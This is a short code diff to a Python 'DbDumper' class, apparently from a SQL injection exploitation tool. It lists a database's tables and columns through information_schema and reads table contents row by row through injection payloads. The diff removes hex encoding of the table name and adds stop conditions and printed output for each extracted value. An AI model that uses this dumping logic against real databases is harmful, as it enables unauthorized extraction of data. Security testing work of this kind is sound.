@@ -23,14 +23,14 @@ class DbDumper:
         """
         return self.list_query('table_name', 'information_schema.tables')
 
-    def columns(self, table):
+    def columns(self, table_value):
         """
         Dump the columns of a table
-        :param table: table name
+        :param table_value: table name
         :return: list of the columns of this table
         """
         return self.list_query('column_name', 'information_schema.columns',
-                               "WHERE table_name = {}".format(SqliEncoder.str_to_hexa(table)))
+                               "WHERE table_name = {}".format(table_value))
 
     def content(self, table, column):
         """
@@ -53,8 +53,12 @@ class DbDumper:
         i = 0
         while True:
             item = self.sf.read_string(self.payloads.one_line_query(column, table, where, i))
-            if item is None:
+            if item is None or item == '':
                 break
+            if i >= 1 and items_[i - 1] == item:
+                print('[-] It seems that we find the same item many times, we stop')
+                break
+            print('[+] read value : {}'.format(item))
             items_.append(item)
             i += 1
         return items_
